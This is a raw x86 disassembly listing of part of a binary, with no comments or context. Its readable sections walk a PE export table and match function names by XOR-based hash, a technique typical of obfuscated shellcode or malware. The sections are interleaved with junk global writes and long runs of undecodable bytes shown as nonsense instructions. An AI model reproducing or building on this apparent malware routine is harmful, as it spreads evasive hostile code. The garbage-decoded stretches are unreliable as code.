  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4336eb
  40c4ce:	and    esi,DWORD PTR ds:0x4336ef
  40c4d4:	mov    DWORD PTR ds:0x4336eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4336bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433683,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43366f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4336fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4336eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4336f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x16725658
  40c577:	in     al,dx
  40c578:	xchg   esi,eax
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	dec    edi
  40c582:	mov    eax,ds:0xeae9b8fe
  40c587:	xor    al,0x82
  40c589:	fstp   DWORD PTR [edx+0x15668337]
  40c58f:	ror    BYTE PTR [ebx+ebx*2-0x53],1
  40c593:	pop    es
  40c594:	in     eax,0x1c
  40c596:	addr16 cld 
  40c598:	or     ch,BYTE PTR [edx-0x5a0ca01a]
  40c59e:	inc    eax
  40c59f:	or     al,0x0
  40c5a1:	data16 ja 0x40c5f4
  40c5a4:	lea    edi,[esi+ecx*2+0x53a19180]
  40c5ab:	mov    bl,0x7c
  40c5ad:	aad    0xe1
  40c5af:	scas   al,BYTE PTR es:[edi]
  40c5b0:	xor    eax,0xa4353ae2
  40c5b5:	sub    eax,0x6aa1ad
  40c5ba:	cli    
  40c5bb:	inc    BYTE PTR [ecx*2-0x25ed30cf]
  40c5c2:	inc    ecx
  40c5c3:	xor    BYTE PTR [ecx+0x7c76e298],ah
  40c5c9:	mov    bh,0x55
  40c5cb:	mov    ecx,0xb552b524
  40c5d0:	xchg   ebp,eax
  40c5d1:	sbb    BYTE PTR [ebx+0x63],bh
  40c5d4:	xchg   ebx,eax
  40c5d5:	(bad)  
  40c5d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5d7:	mov    al,ds:0x57d3adac
  40c5dc:	iret   
  40c5dd:	les    edx,FWORD PTR [edx]
  40c5df:	xor    al,0xf3
  40c5e1:	jns    0x40c60e
  40c5e3:	std    
  40c5e4:	mov    ds:0x71e92772,eax
  40c5e9:	leave  
  40c5ea:	pop    es
  40c5eb:	(bad)  
  40c5ec:	jmp    0x5720b21a
  40c5f1:	(bad)  
  40c5f2:	ins    BYTE PTR es:[edi],dx
  40c5f3:	inc    esi
  40c5f4:	jne    0x40c66e
  40c5f6:	mov    ecx,0x4aab23f3
  40c5fb:	inc    edi
  40c5fc:	cmp    al,0x71
  40c5fe:	sbb    al,0xe1
  40c600:	sub    DWORD PTR [esi+0x6072d389],ebx
  40c606:	aam    0xf0
  40c608:	dec    ecx
  40c609:	mov    eax,0xd3cd365e
  40c60e:	xor    esi,0xf740f743
  40c614:	lock in eax,0xdd
  40c617:	arpl   WORD PTR [ecx-0x61],dx
  40c61a:	stc    
  40c61b:	jmp    0x40c675
  40c61d:	rol    BYTE PTR [eax-0x4430316d],1
  40c623:	in     al,dx
  40c624:	add    BYTE PTR gs:[ecx-0x56],cl
  40c628:	fiadd  WORD PTR [edi]
  40c62a:	and    al,0x9e
  40c62c:	lahf   
  40c62d:	int3   
  40c62e:	in     eax,0x2a
  40c630:	inc    esi
  40c631:	jl     0x40c657
  40c633:	sub    DWORD PTR [edi],ebp
  40c635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c636:	jge    0x40c5e8
  40c638:	mov    ebx,0xec5b9e67
  40c63d:	pop    ecx
  40c63e:	mov    ebx,0x68105c6b
  40c643:	out    dx,eax
  40c644:	sub    esi,esp
  40c646:	pop    eax
  40c647:	inc    ebp
  40c648:	je     0x40c676
  40c64a:	jmp    0x686e507a
  40c64f:	jl     0x40c6c9
  40c651:	call   0x1329:0xde153528
  40c658:	pop    esp
  40c659:	jg     0x40c679
  40c65b:	int3   
  40c65c:	mov    ebx,0x3ecc77ac
  40c661:	adc    DWORD PTR [ecx],esp
  40c663:	sbb    al,0x54
  40c665:	les    ebp,FWORD PTR [esi+eiz*1+0x396207e4]
  40c66c:	rcl    BYTE PTR [eax],1
  40c66e:	aad    0x7c
  40c670:	test   DWORD PTR [esi-0x7ec4a415],esi
  40c676:	adc    BYTE PTR [edi-0x5e],bh
  40c679:	mov    ecx,0x3be33233
  40c67e:	pushf  
  40c67f:	sbb    eax,0x5fe02bf6
  40c684:	pop    ebx
  40c685:	popf   
  40c686:	inc    ebx
  40c687:	xchg   BYTE PTR [esi+0x5106656c],al
  40c68d:	add    DWORD PTR [esi],eax
  40c68f:	int    0x88
  40c691:	pushf  
  40c692:	in     eax,dx
  40c693:	dec    edi
  40c694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c695:	push   esi
  40c696:	fwait
  40c697:	mov    al,0x28
  40c699:	and    BYTE PTR [edi],dh
  40c69b:	loopne 0x40c623
  40c69d:	aam    0x34
  40c69f:	pop    ecx
  40c6a0:	lods   al,BYTE PTR ds:[esi]
  40c6a1:	call   0xb597:0x9be3a683
  40c6a8:	sti    
  40c6a9:	jns    0x40c6f2
  40c6ab:	popa   
  40c6ac:	bound  eax,QWORD PTR [ebp+ebx*2-0x665629eb]
  40c6b3:	rol    DWORD PTR [eax],cl
  40c6b5:	scas   al,BYTE PTR es:[edi]
  40c6b6:	sbb    dl,BYTE PTR [eax]
  40c6b8:	dec    edx
  40c6b9:	dec    ecx
  40c6ba:	dec    ecx
  40c6bb:	mov    cl,0x9b
  40c6bd:	pop    es
  40c6be:	push   ebp
  40c6bf:	cwde   
  40c6c0:	loope  0x40c6bc
  40c6c2:	loope  0x40c673
  40c6c4:	mov    al,0x6e
  40c6c6:	jl     0x40c684
  40c6c8:	shr    DWORD PTR [edx],cl
  40c6ca:	lock mov eax,0x66011523
  40c6d0:	xlat   BYTE PTR ds:[ebx]
  40c6d1:	int3   
  40c6d2:	push   ecx
  40c6d3:	add    ch,BYTE PTR [eax+ecx*2]
  40c6d6:	test   al,0x3d
  40c6d8:	mov    edx,0x5ca2d1cd
  40c6dd:	mov    ch,0x50
  40c6df:	or     ch,bh
  40c6e1:	int3   
  40c6e2:	jmp    0x714397d2
  40c6e7:	mov    edi,0x1b306224
  40c6ec:	fild   QWORD PTR [ebp+0x58]
  40c6ef:	loop   0x40c767
  40c6f1:	shr    BYTE PTR [esi-0x38],0x6a
  40c6f5:	pop    ebx
  40c6f6:	push   ebp
  40c6f7:	mov    ch,0x99
  40c6f9:	xor    ah,BYTE PTR [ecx+0xacb7943]
  40c6ff:	ins    DWORD PTR es:[edi],dx
  40c700:	js     0x40c76d
  40c702:	jb     0x40c6d1
  40c704:	sub    eax,0xf2cc9cbe
  40c709:	or     bh,0x9e
  40c70c:	scas   eax,DWORD PTR es:[edi]
  40c70d:	mov    bl,0x8e
  40c70f:	jbe    0x40c756
  40c711:	and    al,0xe9
  40c713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c714:	jae    0x40c6ad
  40c716:	out    dx,eax
  40c717:	enter  0xd3c3,0x6c
  40c71b:	into   
  40c71c:	or     eax,0x9fe5a475
  40c721:	and    edi,DWORD PTR [ecx+ebp*8-0x2a]
  40c725:	jmp    0xd949:0xdf2b8a79
  40c72c:	adc    DWORD PTR [ebx+0xb48d378],esi
  40c732:	mov    cl,BYTE PTR [ebx-0x4b]
  40c735:	cmc    
  40c736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c737:	imul   esp,ebp,0x144b29bc
  40c73d:	adc    bl,BYTE PTR ds:0x6cd73352
  40c743:	jbe    0x40c707
  40c745:	and    al,0x45
  40c747:	pminsw mm6,QWORD PTR [ecx+0x7d]
  40c74b:	lahf   
  40c74c:	mov    ecx,0x7f1f3d78
  40c751:	scas   eax,DWORD PTR es:[edi]
  40c752:	mov    BYTE PTR [edx+0x4a],dl
  40c755:	cdq    
  40c756:	xor    al,0xb7
  40c758:	dec    esp
  40c759:	test   BYTE PTR [ecx],dl
  40c75b:	pusha  
  40c75c:	leave  
  40c75d:	adc    DWORD PTR [eax-0x2796caf],ebx
  40c763:	cwde   
  40c764:	dec    eax
  40c765:	jbe    0x40c707
  40c767:	mov    al,ds:0x91884889
  40c76c:	add    edx,DWORD PTR [esi]
  40c76e:	jmp    0xc15b:0xe85e9ab2
  40c775:	jmp    0x5a553178
  40c77a:	ins    DWORD PTR es:[edi],dx
  40c77b:	pop    ecx
  40c77c:	(bad)  
  40c77d:	jnp    0x40c7e1
  40c77f:	sbb    DWORD PTR [ecx-0x6d],esi
  40c782:	cmp    eax,DWORD PTR [ecx]
  40c784:	sar    DWORD PTR [eax+0x4c],1
  40c787:	mov    dh,BYTE PTR [eax-0x7c]
  40c78a:	jnp    0x40c78f
  40c78c:	mov    ds:0x5e1bbf74,eax
  40c791:	neg    ecx
  40c793:	mov    eax,DWORD PTR [edx]
  40c795:	xchg   BYTE PTR [esi-0x74],al
  40c798:	(bad)  
  40c799:	retf   
  40c79a:	jmp    0xf59d726c
  40c79f:	lds    edx,FWORD PTR [ebp+0x1b1627bb]
  40c7a5:	mov    ah,0xee
  40c7a7:	cmp    ebp,DWORD PTR [ebp+0x6d96d15d]
  40c7ad:	inc    eax
  40c7ae:	sbb    bh,BYTE PTR [edx-0x67378505]
  40c7b4:	lods   eax,DWORD PTR ds:[esi]
  40c7b5:	push   ss
  40c7b6:	retf   0xdc09
  40c7b9:	mov    bh,0x29
  40c7bb:	add    al,0x8c
  40c7bd:	sbb    cl,BYTE PTR [eax-0x202b8d43]
  40c7c3:	add    al,0x78
  40c7c5:	inc    eax
  40c7c6:	sub    ebx,DWORD PTR [esi+0x116be39a]
  40c7cc:	leave  
  40c7cd:	(bad)  
  40c7ce:	(bad)  
  40c7cf:	lea    ebx,[esi]
  40c7d1:	mov    dh,0xe4
  40c7d3:	mov    ebx,0x52139473
  40c7d8:	cmp    DWORD PTR [ecx-0x70],esi
  40c7db:	pushf  
  40c7dc:	call   0x91b1:0xf19ab57b
  40c7e3:	xchg   ecx,eax
  40c7e4:	in     eax,0xd0
  40c7e6:	adc    dh,BYTE PTR [ebp+edx*2-0x6b]
  40c7ea:	sub    BYTE PTR ds:[eax],dh
  40c7ed:	add    eax,0x9ba63c8a
  40c7f2:	push   eax
  40c7f3:	inc    esp
  40c7f4:	das    
  40c7f5:	mov    ecx,ecx
  40c7f7:	and    ebx,edx
  40c7f9:	jno    0x40c80e
  40c7fb:	jg     0x40c7f9
  40c7fd:	push   esi
  40c7fe:	cwde   
  40c7ff:	gs inc ebx
  40c801:	jge    0x40c800
  40c803:	outs   dx,DWORD PTR ds:[esi]
  40c804:	(bad)  
  40c805:	cli    
  40c806:	xor    ebx,DWORD PTR [ebx-0x46]
  40c809:	cdq    
  40c80a:	ins    DWORD PTR es:[edi],dx
  40c80b:	cld    
  40c80c:	jne    0x40c7e3
  40c80e:	nop
  40c80f:	sub    esi,eax
  40c811:	add    eax,0xffffffd9
  40c814:	add    al,0xa4
  40c816:	out    0xce,al
  40c818:	into   
  40c819:	jge    0x40c860
  40c81b:	and    DWORD PTR [eax],eax
  40c81d:	push   esi
  40c81e:	cdq    
  40c81f:	mov    edi,0xc0543e70
  40c824:	test   DWORD PTR [eax],ebp
  40c826:	jmp    0x51f26fcd
  40c82b:	rcl    DWORD PTR [ebp*8+0x1ee89011],0x8b
  40c833:	lods   al,BYTE PTR ds:[esi]
  40c834:	(bad)  [eax]
  40c836:	cmp    edx,DWORD PTR ds:0xc4f4bc14
  40c83c:	sar    BYTE PTR [edi-0x30],1
  40c83f:	leave  
  40c840:	xchg   edi,eax
  40c841:	jo     0x40c86f
  40c843:	out    0x7b,al
  40c845:	js     0x40c883
  40c847:	call   0xe088:0x82b05d3d
  40c84e:	sbb    BYTE PTR [ebp-0x5c],bh
  40c851:	into   
  40c852:	or     ah,bl
  40c854:	jle    0x40c853
  40c856:	and    cl,dl
  40c858:	leave  
  40c859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85a:	les    edi,FWORD PTR [edx]
  40c85c:	or     eax,0xcf210576
  40c861:	out    dx,eax
  40c862:	repnz imul ebp,ecx,0x936831d7
  40c869:	call   0xeb7ffe56
  40c86e:	call   0xcf8b:0x8165b58f
  40c875:	jmp    0xac6e:0x854c05e5
  40c87c:	fsubr  QWORD PTR [edx+0x5d5b2ed8]
  40c882:	pop    edi
  40c883:	mov    eax,DWORD PTR ds:[ebp-0x14]
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	out    0x12,al
  40c8b4:	in     eax,0x7e
  40c8b6:	daa    
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	in     eax,0xc6
  40c8c0:	mov    gs,WORD PTR [esi-0x16c42d0b]
  40c8c6:	xor    eax,0x4caa0272
  40c8cb:	sbb    ebp,DWORD PTR [esi]
  40c8cd:	loop   0x40c8bd
  40c8cf:	jo     0x40c8e7
  40c8d1:	repnz sbb bl,BYTE PTR [eax-0x30]
  40c8d5:	mov    ebx,0x9343e195
  40c8da:	in     al,0x3e
  40c8dc:	repnz and ch,ah
  40c8df:	dec    ebp
  40c8e0:	dec    ebp
  40c8e1:	ins    BYTE PTR es:[edi],dx
  40c8e2:	dec    esi
  40c8e3:	mov    bl,BYTE PTR [eax]
  40c8e5:	fwait
  40c8e6:	and    al,0xae
  40c8e8:	push   ebx
  40c8e9:	(bad)  
  40c8ea:	popf   
  40c8eb:	inc    esi
  40c8ec:	into   
  40c8ed:	shr    BYTE PTR [edx+0x1],1
  40c8f0:	call   0x66e:0x61924e2d
  40c8f7:	mov    ds:0x21e06d82,al
  40c8fc:	dec    esp
  40c8fd:	and    bl,BYTE PTR [esi]
  40c8ff:	mov    ah,0x7e
  40c901:	test   ah,bl
  40c903:	mov    esp,0x92f63d3e
  40c908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c909:	leave  
  40c90a:	xlat   BYTE PTR ds:[ebx]
  40c90b:	inc    edi
  40c90c:	and    ch,BYTE PTR ds:0x617f69eb
  40c912:	aaa    
  40c913:	scas   eax,DWORD PTR es:[edi]
  40c914:	pop    ds
  40c915:	push   ss
  40c916:	cmp    DWORD PTR [ebp-0x41],ecx
  40c919:	jecxz  0x40c991
  40c91b:	mov    al,0x69
  40c91d:	pop    ds
  40c91e:	push   eax
  40c91f:	sti    
  40c920:	jae    0x40c969
  40c922:	jg     0x40c91d
  40c924:	cmp    esi,DWORD PTR ds:[edx-0x4b]
  40c928:	push   eax
  40c929:	mov    dl,0x8b
  40c92b:	inc    edi
  40c92c:	int    0x2
  40c92e:	pop    eax
  40c92f:	test   eax,0x4367995e
  40c934:	add    eax,0x4e2b64ad
  40c939:	xchg   ebx,eax
  40c93a:	call   0x74254213
  40c93f:	test   DWORD PTR [ecx],eax
  40c941:	mov    eax,0x90050da2
  40c946:	jl     0x40c93d
  40c948:	and    esp,DWORD PTR [ecx]
  40c94a:	ins    BYTE PTR es:[edi],dx
  40c94b:	dec    eax
  40c94c:	xor    cl,ah
  40c94e:	pop    ds
  40c94f:	(bad)  
  40c950:	ins    DWORD PTR es:[edi],dx
  40c951:	cmp    BYTE PTR [esi+edx*4-0x5c],0xc5
  40c956:	or     al,0x6f
  40c958:	loope  0x40c952
  40c95a:	or     bh,BYTE PTR [eax+0x6f98e0a8]
  40c960:	sub    eax,0xefc4eaa9
  40c965:	sar    DWORD PTR [esi+edx*1-0x64],1
  40c969:	sbb    al,0x2a
  40c96b:	aaa    
  40c96c:	cmp    esp,DWORD PTR [ebx+0x40]
  40c96f:	mov    ebp,0x26b946dd
  40c974:	pop    ebx
  40c975:	sub    BYTE PTR [eax-0xc3f2ae5],0xa7
  40c97c:	pop    ds
  40c97d:	out    0x82,eax
  40c97f:	fld    st(4)
  40c981:	std    
  40c982:	inc    eax
  40c983:	or     BYTE PTR [ecx-0x460c9543],cl
  40c989:	pop    eax
  40c98a:	cs call 0x51788d08
  40c990:	sbb    BYTE PTR [ebx+0x35],0x9f
  40c994:	push   ss
  40c995:	imul   ebx,esp,0xffffffce
  40c998:	dec    eax
  40c999:	in     al,0x24
  40c99b:	add    dl,dl
  40c99d:	es (bad) 
  40c9a0:	mov    eax,ds:0x229105eb
  40c9a5:	(bad)  
  40c9a6:	fst    st(7)
  40c9a8:	sar    bl,cl
  40c9aa:	ja     0x40ca14
  40c9ac:	in     eax,dx
  40c9ad:	fild   QWORD PTR [ecx]
  40c9af:	adc    dh,BYTE PTR ds:0xd1375319
  40c9b5:	jle    0x40c995
  40c9b7:	fwait
  40c9b8:	xchg   edi,ebp
  40c9ba:	inc    ebp
  40c9bb:	mov    ds:0x4a53b859,eax
  40c9c0:	or     esi,DWORD PTR ds:0x28ff2c90
  40c9c6:	lods   eax,DWORD PTR ds:[esi]
  40c9c7:	and    BYTE PTR [esi],0xff
  40c9ca:	fwait
  40c9cb:	inc    esp
  40c9cc:	xor    al,0x65
  40c9ce:	clc    
  40c9cf:	(bad)  
  40c9d0:	push   0xe4cfeb49
  40c9d5:	test   al,0xa9
  40c9d7:	arpl   WORD PTR [esi+0xd],bp
  40c9da:	es mov eax,0x11712e92
  40c9e0:	xchg   DWORD PTR [edi+0x6279b5e6],eax
  40c9e6:	adc    BYTE PTR [edx-0x38a45cf9],0x13
  40c9ed:	sahf   
  40c9ee:	pop    ss
  40c9ef:	sub    ebp,esp
  40c9f1:	fistp  QWORD PTR [edi+0x6db844f5]
  40c9f7:	dec    esi
  40c9f8:	loop   0x40ca62
  40c9fa:	mov    ebp,0x19f23e37
  40c9ff:	ret    
  40ca00:	je     0x40ca4d
  40ca02:	inc    ebx
  40ca03:	xchg   ebx,eax
  40ca04:	xlat   BYTE PTR ds:[ebx]
  40ca05:	nop
  40ca06:	in     eax,0xa2
  40ca08:	ins    DWORD PTR es:[edi],dx
  40ca09:	sar    DWORD PTR [ecx+ebp*2+0x7d051e3f],cl
  40ca10:	xchg   bp,ax
  40ca12:	hlt    
  40ca13:	sub    edi,DWORD PTR [eax-0x30818976]
  40ca19:	in     al,dx
  40ca1a:	das    
  40ca1b:	(bad)  
  40ca1c:	pop    ebx
  40ca1d:	test   eax,0x69375199
  40ca22:	pop    edi
  40ca23:	(bad)  
  40ca24:	lahf   
  40ca25:	push   esi
  40ca26:	add    DWORD PTR [eax],ecx
  40ca28:	imul   edi,DWORD PTR [eax-0x23],0xe90927db
  40ca2f:	ret    
  40ca30:	or     ch,BYTE PTR [ecx-0x407aca1c]
  40ca36:	inc    ecx
  40ca37:	arpl   WORD PTR [edi+0x3a37c872],sp
  40ca3d:	pusha  
  40ca3e:	addr16 jmp 0x40ca7c
  40ca41:	cmp    DWORD PTR [esi],0x8
  40ca44:	cmp    dh,BYTE PTR [ebx]
  40ca46:	(bad)  
  40ca47:	cld    
  40ca48:	xor    al,0x45
  40ca4a:	push   ss
  40ca4b:	adc    bl,bl
  40ca4d:	ror    BYTE PTR [edx+0x78],0x16
  40ca51:	mov    bl,0xe4
  40ca53:	fld    DWORD PTR [ebp+0x602ed09b]
  40ca59:	nop
  40ca5a:	jge    0x40ca40
  40ca5c:	call   0x524f:0xfb9a77e3
  40ca63:	not    DWORD PTR [edx]
  40ca65:	cld    
  40ca66:	std    
  40ca67:	outs   dx,BYTE PTR ds:[esi]
  40ca68:	int3   
  40ca69:	sbb    eax,0xcc942b3d
  40ca6e:	cmp    dh,BYTE PTR [edi]
  40ca70:	sub    al,0xae
  40ca72:	fidivr WORD PTR [ecx+esi*1+0x18]
  40ca76:	test   eax,0x78c2c2b1
  40ca7b:	jecxz  0x40caac
  40ca7d:	push   edx
  40ca7e:	cli    
  40ca7f:	and    esi,DWORD PTR [ebp+0x1b]
  40ca82:	mov    es,ebx
  40ca84:	push   ds
  40ca85:	clc    
  40ca86:	or     edi,DWORD PTR [edi]
  40ca88:	xchg   BYTE PTR [edi+0x69],dl
  40ca8b:	adc    al,0x73
  40ca8d:	cdq    
  40ca8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca8f:	jne    0x40ca21
  40ca91:	inc    edi
  40ca92:	add    edx,ebp
  40ca94:	ror    DWORD PTR [ebp+0x3f],1
  40ca97:	adc    WORD PTR [ebp-0x341170e],si
  40ca9e:	repz jnp 0x40caaa
  40caa1:	add    BYTE PTR [ebx+0x48],bh
  40caa4:	js     0x40ca5d
  40caa6:	push   0x54191846
  40caab:	cmp    DWORD PTR [esi+0x50],esi
  40caae:	inc    edi
  40caaf:	sbb    BYTE PTR [edx-0x75],ah
  40cab2:	mov    WORD PTR [edi-0xe80947d],cs
  40cab8:	xchg   edx,eax
  40cab9:	cmp    al,0x92
  40cabb:	repnz dec eax
  40cabd:	mov    esp,eax
  40cabf:	push   ebx
  40cac0:	arpl   WORD PTR [ebp-0x47d96aa2],cx
  40cac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cac7:	clc    
  40cac8:	loop   0x40cb01
  40caca:	lahf   
  40cacb:	out    0x76,al
  40cacd:	inc    ebp
  40cace:	pop    es
  40cacf:	je     0x40ca75
  40cad1:	cs inc ebp
  40cad3:	or     DWORD PTR [eax],edx
  40cad5:	loop   0x40cad8
  40cad7:	nop
  40cad8:	lahf   
  40cad9:	lahf   
  40cada:	out    dx,eax
  40cadb:	mov    dl,BYTE PTR [eax+esi*4-0x10]
  40cadf:	pop    ebp
  40cae1:	dec    eax
  40cae2:	loopne 0x40caee
  40cae4:	in     al,dx
  40cae5:	add    BYTE PTR [ebp+0x404f8c02],al
  40caeb:	lahf   
  40caec:	xchg   BYTE PTR [ecx],dh
  40caee:	cmp    BYTE PTR [edi-0x70091833],bh
  40caf4:	dec    eax
  40caf5:	les    esp,FWORD PTR [esi+eax*1]
  40caf8:	test   al,0xc6
  40cafa:	fdivr  st(2),st
  40cafc:	xchg   BYTE PTR [edx-0x2f9c9edb],dh
  40cb02:	xor    BYTE PTR [ebp+0x4c],dl
  40cb05:	push   esp
  40cb06:	daa    
  40cb07:	ss xchg edi,eax
  40cb09:	mov    eax,ds:0x3ba54de5
  40cb0e:	dec    esp
  40cb0f:	jbe    0x40cab2
  40cb11:	jle    0x40caaf
  40cb13:	imul   edx,DWORD PTR [edi+0x5b8cfe2d],0x2589e002
  40cb1d:	aas    
  40cb1e:	xchg   ecx,eax
  40cb1f:	jg     0x40caa1
  40cb21:	outs   dx,DWORD PTR ds:[esi]
  40cb22:	std    
  40cb23:	retf   0xfc59
  40cb26:	scas   al,BYTE PTR es:[edi]
  40cb27:	out    0xf1,al
  40cb29:	cs jg  0x40cb7f
  40cb2c:	in     al,0x82
  40cb2e:	ja     0x40cb2d
  40cb30:	push   eax
  40cb31:	imul   ebx,DWORD PTR [ebp-0x4c],0x8fb495e1
  40cb38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb39:	retf   
  40cb3a:	lds    edi,FWORD PTR [edi-0x50]
  40cb3d:	call   0x9f71:0x9ef30d72
  40cb44:	mov    fs,WORD PTR [eax+0x1040a50e]
  40cb4a:	add    bh,BYTE PTR ds:0x59f7d7f6
  40cb50:	add    DWORD PTR [esi-0x4f9b7bd0],ebx
  40cb56:	cs cmp eax,ecx
  40cb59:	push   edx
  40cb5a:	sahf   
  40cb5b:	push   es
  40cb5c:	add    al,0xb0
  40cb5e:	jne    0x40cb07
  40cb60:	aas    
  40cb61:	mov    bl,0xf1
  40cb63:	ror    DWORD PTR [eax],1
  40cb65:	pop    edx
  40cb66:	jne    0x40caeb
  40cb68:	add    ebp,DWORD PTR [edx-0x1c]
  40cb6b:	xchg   ebx,eax
  40cb6c:	out    0x7b,eax
  40cb6e:	inc    ebx
  40cb6f:	push   cs
  40cb70:	and    al,0xfa
  40cb72:	jg     0x40cb52
  40cb74:	add    eax,0x2946c519
  40cb79:	dec    ebp
  40cb7a:	das    
  40cb7b:	rcr    DWORD PTR [edx-0x79],1
  40cb7e:	jno    0x40cb91
  40cb80:	rcr    DWORD PTR [edx],0x15
  40cb83:	mov    eax,0x24e65010
  40cb88:	mov    cl,0xc4
  40cb8a:	pop    es
  40cb8b:	das    
  40cb8c:	pop    esp
  40cb8d:	cmp    eax,0xbed614d6
  40cb92:	dec    edx
  40cb93:	call   0x70cf:0x1c4cae59
  40cb9a:	loop   0x40cb5a
  40cb9c:	retf   
  40cb9d:	in     eax,0xbf
  40cb9f:	push   ebp
  40cba0:	retf   
  40cba1:	push   es
  40cba2:	xchg   esi,eax
  40cba3:	dec    ecx
  40cba4:	dec    edx
  40cba5:	inc    edi
  40cba6:	cmc    
  40cba7:	push   cs
  40cba8:	retf   
  40cba9:	out    dx,eax
  40cbaa:	icebp  
  40cbab:	aas    
  40cbac:	lahf   
  40cbad:	aad    0x93
  40cbaf:	aaa    
  40cbb0:	inc    esi
  40cbb1:	lods   eax,DWORD PTR ds:[esi]
  40cbb2:	test   BYTE PTR [edx],0x31
  40cbb5:	cmp    esi,DWORD PTR [edx-0x73ace478]
  40cbbb:	push   esi
  40cbbc:	rcr    DWORD PTR ds:0x507d2016,1
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0xb231fb2c
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	clc    
  40cc4f:	xor    al,0x3c
  40cc51:	test   eax,0xdf23d0d8
  40cc56:	fs out 0x2d,eax
  40cc59:	retf   0x7997
  40cc5c:	mov    ebx,0xd3dca127
  40cc61:	ja     0x40ccc2
  40cc63:	or     DWORD PTR [ebx-0xae07f28],ebp
  40cc69:	popf   
  40cc6a:	lock in al,0xf9
  40cc6d:	call   0xdfd4:0xed5326a8
  40cc74:	imul   ebp,ecx,0x90beaa5a
  40cc7a:	rcr    BYTE PTR [edx+0x61],cl
  40cc7d:	(bad)  
  40cc7e:	xchg   ebx,eax
  40cc7f:	jp     0x40cc60
  40cc81:	sahf   
